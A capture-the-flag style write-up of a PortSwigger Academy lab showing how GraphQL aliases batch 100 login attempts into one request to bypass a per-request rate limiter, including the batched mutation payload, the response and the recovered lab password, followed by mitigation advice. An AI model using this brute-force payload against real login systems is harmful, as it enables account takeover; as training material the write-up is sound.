---
title: Bypassing GraphQL brute force protections
event: portswiggeracademy
category: graphql-api
points:
difficulty: practitioner
date: 2026-09-11
tags: [graphql, aliases, brute-force, rate-limiting, python, burp]
status: published
---

# Bypassing GraphQL brute force protections

> **Event:** portswiggeracademy · **Category:** graphql-api

## Challenge

> This lab's login mechanism uses GraphQL and is protected against brute-force
> attacks. To solve the lab, brute-force the login to sign in as `carlos`. His
> password is one of the 100 most common. You can use the following [list of
> candidate passwords](https://portswigger.net/web-security/authentication/auth-lab-passwords).

The rate limiter blocks you after a few failed logins, so 100 separate requests
is a non-starter. The task is to make all 100 guesses without tripping it.

## TL;DR

The protection counts *requests*, not login *operations*. GraphQL aliases let one
request carry all 100 `login` mutations, each under a unique alias, so a single
POST tries every password at once. Read the response for the alias whose
`success` is `true`.

## Approach

### 1. Find the login mutation

Watching a normal login in Burp shows a POST to `/graphql/v1` with a `login`
mutation returning `success` and `token`. Aliases let the same field appear many
times in one document:

```graphql
mutation {
  a0: login(input: {username: "carlos", password: "123456"}) { success token }
  a1: login(input: {username: "carlos", password: "password"}) { success token }
}
```

<details>
<summary>What didn't work here</summary>

**Tried:** repeating the single normal login request in Repeater / Intruder.

**Why it failed:** each attempt is one request, and the rate limiter counts
requests — it blocks after a handful regardless of the credential. The limiter
never inspects *how many* operations a request contains, which is the gap.

</details>

### 2. Generate the batched query

`graphql_maker.py` ([files/](files/graphql_maker.py)) builds one `mutation` with
100 aliased logins (`a0`..`a99`), one per candidate password, and wraps it in the
`{"query":"..."}` JSON envelope:

```bash
python3 files/graphql_maker.py
```

```json
{"query":"mutation{a0:login(input:{username:\"carlos\",password:\"123456\"}){success token}...a99:login(input:{username:\"carlos\",password:\"moscow\"}){success token}}"}
```

### 3. Send it and read the winning alias

Paste that body into a single `POST /graphql/v1` in Burp Repeater. The response
returns one entry per alias — every wrong guess is `"success": false`, the right
one is `true`:

```json
"a4": { "success": true, "token": "..." }
```

`a4` is index 4 in the password list → `123456789`. Log in as `carlos` with it to
solve the lab.

## Flag

```
carlos : 123456789
```

## Learn more

GraphQL aliases exist so a client can request the same field more than once in a
response without key collisions. That same feature turns a per-request rate limit
into a per-*request* joke: nesting N operations means N attempts at the cost of
one. It's the request-batching sibling of an [array-based batching attack](https://portswigger.net/web-security/graphql#bypassing-rate-limiting-using-aliases).

The fix is to rate-limit at the level of *operations*, not HTTP requests — count
each `login` call, cap the number of aliased fields per document, and enforce
query cost/depth limits so a single request can't fan out arbitrarily.

- [PortSwigger — Working with GraphQL in Burp Suite](https://portswigger.net/web-security/graphql)

## Tools

`python3`, `burp`
